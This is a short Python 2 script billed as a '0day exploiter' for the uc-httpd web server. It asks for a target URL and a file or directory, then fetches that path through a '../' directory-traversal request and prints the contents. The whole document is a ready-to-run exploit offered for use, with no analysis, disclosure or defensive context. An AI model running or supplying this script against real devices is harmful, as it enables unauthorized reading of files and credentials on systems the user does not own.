#!/usr/bin/env python
import urllib2, httplib, sys

httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsm_str = 'HTTP/1.0'

print "[+] uc-httpd 0day exploiter [+]"
print "[+] usage: python " + __file__ + " http://<target_ip>"

host = sys.argv[1]
fd = raw_input('[+] File or Directory: ')

print "Exploiting....."
print '\n'
print urllib2.urlopen(host + '/../../../../..' + fd).read()
#python2.7
